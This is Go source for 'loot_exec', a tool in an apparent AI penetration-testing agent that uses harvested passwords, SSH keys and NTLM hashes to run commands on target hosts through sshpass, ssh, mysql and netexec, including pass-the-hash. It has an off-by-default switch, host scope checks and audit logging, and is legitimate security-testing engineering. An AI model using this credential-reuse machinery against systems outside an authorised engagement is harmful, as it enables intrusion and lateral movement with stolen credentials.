package agent

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	actool "github.com/lin9527ya/Norma/tool"
	"github.com/lin9527ya/blade/db"
)

// LootExecEnabled 是 loot_exec 的总开关（**默认关**）：它把库里的凭据直接变成对目标的
// 动作——风险最高的一类能力，所以出厂不启用。server 层接到设置项 agent_loot_exec。
var LootExecEnabled func() bool

func lootExecOn() bool { return LootExecEnabled != nil && LootExecEnabled() }

// lootExec 用一条**已登记的凭据**在目标上执行命令，凭据明文不经过模型、命令与台账。
//
// 它解决的是一件具体的事：手里握着 wp_user 的口令，此前只能让模型把明文贴进命令行
// （于是明文进了提示词、工具输入、台账与日志），或者重新手打一遍。这里改成：
// 平台按凭据构造连接，明文经 0600 临时文件 + 环境变量交给客户端，命令字符串里只有
// 文件路径；客户端读走即删。
//
// 只支持 credential，且只支持 ssh（password/key）与 mysql——据点(foothold)没有结构化
// 的连法（payload 里只有一句自由文本 detail），硬编一条连接只会猜错。凭据的 hash/token
// 同理：怎么用取决于算法与目标，交给模型自己构造，别给一个假装通用的入口。
func (t *ToolSet) lootExec() actool.CoreTool {
	return writeTool("loot_exec",
		"用一条**已登记的凭据**在目标上执行命令（ssh / mysql / Windows·AD）。凭据明文不会出现在命令、工具输入或台账里——"+
			"平台按 loot_id 取出凭据，经 0600 临时文件交给 sshpass/ssh/mysql（Windows/AD 走 nxc：命令写进 0600 脚本、跑完即删）。\n"+
			"★ 只支持 credential 节点。协议：ssh（password→sshpass / key→ssh -i）、mysql（password）、"+
			"以及 Windows/AD 的 smb / winrm / mssql / ldap（password 或 **hash**，走 nxc；镜像里需装有 nxc）。"+
			"token 型与据点(foothold)请用专门入口或自己构造。\n"+
			"★ host 必填且必须能在凭据的 targets 里找到（平台据此做授权范围校验，不猜目标）。\n"+
			"★ 命令在后台执行：返回 execution_id，用 get_execution / wait_execution 取输出，"+
			"要具体行用 grep_execution。",
		obj(map[string]any{
			"loot_id":    idp("凭据节点 id（graph_overview 的 credentials；必须是在手且有效的）"),
			"host":       str("在哪台目标上执行（**必填**：必须与凭据 targets 里的某条 host 一致）"),
			"command":    str("要在目标上执行的命令（非交互；远程侧按原样执行）"),
			"timeout_ms": intp("可选硬超时毫秒（到点杀进程）；省略=不限"),
		}, "loot_id", "host", "command"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if !lootExecOn() {
				return actool.Errorf("loot_exec: 该能力默认关闭（它会把库里的凭据直接变成对目标的动作）。" +
					"请让操作者在设置里打开 agent_loot_exec；在此之前用 Bash 自己构造连接。"), nil
			}
			if !t.execToolsReady() {
				return actool.Errorf("loot_exec: 执行服务未接线（当前运行环境不支持后台执行），请改用 Bash"), nil
			}
			var a struct {
				LootID    json.RawMessage `json:"loot_id"`
				Host      string          `json:"host"`
				Command   string          `json:"command"`
				TimeoutMs int             `json:"timeout_ms"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf(err.Error()), nil
			}
			id := pid(a.LootID)
			if id <= 0 {
				return actool.Errorf("loot_exec: loot_id 必填"), nil
			}
			if strings.TrimSpace(a.Command) == "" {
				return actool.Errorf("loot_exec: command 不能为空"), nil
			}
			host := strings.TrimSpace(a.Host)
			if host == "" {
				return actool.Errorf("loot_exec: host 必填——平台要按它做授权范围校验，不替你猜目标"), nil
			}

			node, err := t.ts.GetNode(id)
			if err != nil || node == nil {
				return actool.Errorf(fmt.Sprintf("loot_exec: %d 不存在于本任务", id)), nil
			}
			if node.Kind != db.KindCredential {
				if node.Kind == db.KindFoothold {
					return actool.Errorf(fmt.Sprintf("loot_exec: %d 是据点(foothold)。据点没有结构化的连法（只记了什么权限、怎么进去的描述），"+
						"平台无法替你构造连接——请按它的 detail 用 Bash 自己连，或把可用的凭据 report_credential 记下来再用本工具", id)), nil
				}
				return actool.Errorf(fmt.Sprintf("loot_exec: %d 是 %s 节点，不是凭据", id, node.Kind)), nil
			}
			if node.State != db.StateLootActive {
				return actool.Errorf(fmt.Sprintf("loot_exec: 凭据 %d 当前状态是 %q（已失效），不能拿它去连", id, node.State)), nil
			}
			v := db.ParseCredential(node)
			kind := strings.ToLower(strings.TrimSpace(v.Kind))
			if kind != "password" && kind != "key" && kind != "hash" {
				return actool.Errorf(fmt.Sprintf("loot_exec: 凭据类型 %q 不支持自动连接（支持 password / key / hash）。"+
					"token 走对应服务的认证方式，请用 Bash 自己构造", v.Kind)), nil
			}
			target, err := pickCredentialTarget(v, host)
			if err != nil {
				return actool.Errorf("loot_exec: " + err.Error()), nil
			}
			service := strings.ToLower(strings.TrimSpace(target.Service))
			if service == "" {
				service = defaultServiceForPort(target.Port)
			}
			action, nxc := nxcServices[service]
			if service != "ssh" && service != "mysql" && !nxc {
				return actool.Errorf(fmt.Sprintf("loot_exec: 目标服务是 %q，本工具支持 ssh / mysql / %s；其它服务请用 Bash 自己构造连接",
					target.Service, strings.Join(nxcServiceNames(), " / "))), nil
			}
			// 每种服务能接哪种凭据：ssh 认口令与私钥，mysql 只认口令，nxc 类认口令与哈希
			// （传递哈希是 Windows/AD 的常态——把它挡在门外等于让一半战果用不上）。
			switch {
			case service == "ssh" && kind == "hash":
				return actool.Errorf("loot_exec: ssh 不支持 hash 型凭据（需要口令或私钥）；哈希可用于 smb / winrm / mssql / ldap"), nil
			case service == "mysql" && kind != "password":
				return actool.Errorf(fmt.Sprintf("loot_exec: mysql 只支持 password 型凭据（收到 %q）", kind)), nil
			case nxc && kind == "key":
				return actool.Errorf(fmt.Sprintf("loot_exec: %s 不支持 key 型凭据；私钥只能用于 ssh", service)), nil
			}
			user := strings.TrimSpace(v.Username)
			if user == "" {
				return actool.Errorf(fmt.Sprintf("loot_exec: 这条凭据没有登记 username，无法登录；请用 node_detail(%d) 核对，必要时重新 report_credential", id)), nil
			}

			var command string
			var cleanup func()
			if nxc {
				command, cleanup, err = buildNXCCommand(service, action, user, host, target.Port, kind, v.Secret, a.Command)
				if err != nil {
					return actool.Errorf("loot_exec: 无法构造连接：" + err.Error()), nil
				}
			} else {
				secretPath, serr := writeLootSecret(v.Secret)
				if serr != nil {
					return actool.Errorf("loot_exec: 无法暂存凭据明文：" + serr.Error()), nil
				}
				cleanup = func() { _ = removeLootSecret(secretPath) }
				command = buildLootCommand(kind, service, user, host, target.Port, secretPath, a.Command)
			}
			var timeout time.Duration
			if a.TimeoutMs > 0 {
				timeout = time.Duration(a.TimeoutMs) * time.Millisecond
			}
			desc := fmt.Sprintf("loot_exec：用凭据 %d（%s）在 %s 上执行", id, v.Fingerprint(), host)
			st, err := t.execService.Submit(ctx, t.taskIDStr(), t.ownerNode, t.worker, command, desc, timeout)
			if err != nil {
				cleanup() // 没起来就别留明文文件
				return actool.Errorf("loot_exec: " + err.Error()), nil
			}
			// 留痕：谁在什么时候动用了哪条凭据（只记指纹，不记明文）。
			t.auditLootExec("loot_exec", fmt.Sprintf("动用凭据 %s 在 %s 上执行命令", v.Fingerprint(), host),
				fmt.Sprintf("凭据节点 #%d → %s@%s:%d\n命令：%s", id, user, host, portOf(service, target.Port), a.Command))
			raw, _ := json.Marshal(st)
			return actool.Text(fmt.Sprintf("execution started: %d\n%s\n凭据 %s 已用于连接 %s（明文未进入命令/台账）；用 get_execution(%d) 取输出。",
				st.ID, raw, v.Fingerprint(), host, st.ID)), nil
		})
}

// pickCredentialTarget 选出这次要连的目标。host 必须命中已登记的目标——平台不猜：
// 凭据能登哪里是**在这条目标上验证过的**结论，不是"大概是同一台机器"。
func pickCredentialTarget(v db.CredentialView, host string) (db.CredentialTarget, error) {
	if len(v.Targets) == 0 {
		return db.CredentialTarget{}, fmt.Errorf("这条凭据没有登记 targets（能登哪）：先用 report_credential 补上 host/端口/服务，" +
			"或自己用 Bash 连——平台不替你猜目标")
	}
	want := normalizeHost(host)
	for _, t := range v.Targets {
		if normalizeHost(t.Host) == want {
			return t, nil
		}
	}
	known := make([]string, 0, len(v.Targets))
	for _, t := range v.Targets {
		known = append(known, t.Host)
	}
	return db.CredentialTarget{}, fmt.Errorf("凭据的 targets 里没有 host=%s（已登记：%s）。"+
		"要么换一条已登记的目标，要么先用 report_credential 把这条目标补进 targets", host, strings.Join(known, "、"))
}

// normalizeHost 去掉端口与方括号并小写，用于比对"是不是同一台"。
func normalizeHost(h string) string {
	h = strings.ToLower(strings.TrimSpace(h))
	h = strings.TrimPrefix(h, "[")
	if i := strings.Index(h, "]"); i >= 0 {
		return h[:i]
	}
	if i := strings.LastIndex(h, ":"); i > 0 && !strings.Contains(h[i+1:], ":") {
		return h[:i]
	}
	return h
}

func portOf(service string, port int) int {
	if port > 0 {
		return port
	}
	if service == "mysql" {
		return 3306
	}
	return 22
}

// writeLootSecret 把明文写进一个 0700 目录下的 0600 文件，返回文件路径。
// 目录单独建：连接端读完就删文件，万一删失败也只是留下一个不可读的残骸。
func writeLootSecret(secret string) (string, error) { return writeLootFile("secret", secret) }

// writeLootScript 把一段脚本写成 0600 文件。Windows/AD 工具（nxc）只接受命令行上的
// 口令/哈希，没有"从文件读"，所以把整条命令放进脚本、由 `sh 脚本` 调用——命令串与台账
// 里因此没有明文，脚本执行完立即删除。
func writeLootScript(content string) (string, error) { return writeLootFile("run.sh", content) }

func writeLootFile(name, content string) (string, error) {
	dir, err := os.MkdirTemp("", "blade-loot-")
	if err != nil {
		return "", err
	}
	if err := os.Chmod(dir, 0o700); err != nil {
		_ = os.RemoveAll(dir)
		return "", err
	}
	path := filepath.Join(dir, name)
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		_ = os.RemoveAll(dir)
		return "", err
	}
	if _, err := f.WriteString(content); err != nil {
		f.Close()
		_ = os.RemoveAll(dir)
		return "", err
	}
	if err := f.Close(); err != nil {
		_ = os.RemoveAll(dir)
		return "", err
	}
	return path, nil
}

// buildLootCommand 构造交给后台执行服务的命令。
//
// 三条纪律：
//   - **明文不进命令**：口令/私钥都从 0600 临时文件读，命令里只有路径；读到即删。
//   - **远程命令按原样执行**：用户给的命令先 base64，再在远端侧解码，避免引号/分号
//     在本地 shell 里被解释（那是把模型输出当代码执行）。
//   - **不校验主机指纹**：渗透目标的主机密钥没有可信来源，StrictHostKeyChecking=accept-new
//     只记首次密钥、不阻断连接；UserKnownHostsFile=/dev/null 保证不污染本机 known_hosts。
func buildLootCommand(kind, service, user, host string, port int, secretPath, remote string) string {
	sp := shQuote(secretPath)
	b64 := base64.StdEncoding.EncodeToString([]byte(remote))
	port = portOf(service, port)
	switch {
	case service == "ssh" && kind == "key":
		return fmt.Sprintf(
			`ssh -i %s -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -p %d %s "$(printf %%s %s | base64 -d)"; rc=$?; rm -f %s; exit $rc`,
			sp, port, shQuote(user+"@"+host), shQuote(b64), sp)
	case service == "ssh":
		return fmt.Sprintf(
			`SSHPASS="$(cat %s)"; rm -f %s; export SSHPASS; exec sshpass -e ssh -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -p %d %s "$(printf %%s %s | base64 -d)"`,
			sp, sp, port, shQuote(user+"@"+host), shQuote(b64))
	default: // mysql + password
		return fmt.Sprintf(
			`d=$(mktemp -d) || exit 1; f="$d/my.cnf"; umask 077; `+
				`printf '[client]\nuser=%%s\npassword=%%s\nhost=%%s\nport=%%s\n' %s "$(cat %s)" %s %d > "$f"; `+
				`rm -f %s; mysql --defaults-extra-file="$f" -e "$(printf %%s %s | base64 -d)"; rc=$?; rm -rf "$d"; exit $rc`,
			shQuote(user), sp, shQuote(host), port, sp, shQuote(b64))
	}
}

// shQuote 用单引号包住一段文本（供 /bin/sh）。
func shQuote(s string) string { return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'" }

// removeLootSecret 删掉一次性明文目录（0600 文件 + 0700 目录一起清掉）。
func removeLootSecret(path string) error {
	if path == "" {
		return nil
	}
	return os.RemoveAll(filepath.Dir(path))
}

// auditLootExec 给「动用了战果」留一条时间线。调用方负责只写指纹/节点 id 与命令，
// **绝不写明文**——时间线会进 UI、导出与日志。
func (t *ToolSet) auditLootExec(kind, summary, detail string) {
	if t.ts == nil {
		return
	}
	act := db.Activity{Worker: t.worker, Kind: kind, Summary: summary, Detail: detail}
	if t.ownerNode > 0 {
		owner := t.ownerNode
		act.NodeID = &owner
	}
	_, _ = t.ts.AppendActivity(act)
}

// nxcServices 是走 nxc（netexec）的协议闭集，值是把"动作"传进去的参数。
// smb / winrm 是执行命令（-x），mssql 是 SQL（-q），ldap 是查询（--query）。
var nxcServices = map[string]string{
	"smb":   "-x",
	"winrm": "-x",
	"mssql": "-q",
	"ldap":  "--query",
}

func nxcServiceNames() []string { return []string{"smb", "winrm", "mssql", "ldap"} }

// defaultServiceForPort 在凭据没写 service 时按端口猜——只认明确的服务端口，
// 其余一律当 ssh（历史行为，也是 Linux 目标的常态）。
func defaultServiceForPort(port int) string {
	switch port {
	case 3306:
		return "mysql"
	case 445:
		return "smb"
	case 5985, 5986:
		return "winrm"
	case 1433:
		return "mssql"
	case 389, 636:
		return "ldap"
	}
	return "ssh"
}

// buildNXCCommand 构造 Windows/AD 的认证执行命令。
//
// 明文处理：nxc 没有"从文件读凭据"的选项，所以整条命令写进 0600 脚本、用 `sh 脚本`
// 调用——**命令串、台账、模型上下文里都没有明文**，脚本执行完立刻删除。代价是执行期间
// 本机 `ps` 能看到子进程参数，这是这类工具的固有形态（sshpass/ssh 那条路径没有这个问题）。
func buildNXCCommand(service, action, user, host string, port int, kind, secret, command string) (string, func(), error) {
	secretFlag := "-p"
	if kind == "hash" {
		secretFlag = "-H"
	}
	proto := "nxc " + service + " " + shQuote(host)
	if port > 0 {
		proto += fmt.Sprintf(" --port %d", port)
	}
	script := fmt.Sprintf("#!/bin/sh\nexec %s -u %s %s %s %s %s\n",
		proto, shQuote(user), secretFlag, shQuote(secret), action, shQuote(command))
	path, err := writeLootScript(script)
	if err != nil {
		return "", nil, err
	}
	cleanup := func() { _ = removeLootSecret(path) }
	return fmt.Sprintf("sh %s; rc=$?; rm -rf %s; exit $rc", shQuote(path), shQuote(filepath.Dir(path))), cleanup, nil
}
